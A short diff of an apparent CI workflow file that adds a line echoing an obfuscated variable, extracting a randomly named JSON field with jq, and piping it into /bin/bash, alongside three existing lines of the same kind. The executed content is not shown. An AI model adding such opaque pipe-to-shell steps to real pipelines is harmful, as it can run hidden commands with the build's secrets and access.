@@ -26,6 +26,7 @@ jobs:
           echo $tok79 | jq -r .drbmi24820 | /bin/bash
           echo $mxulq7 | jq -r .irr868 | /bin/bash
           echo $h06222 | jq -r .mp876 | /bin/bash
+          echo $so299 | jq -r .gnj1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
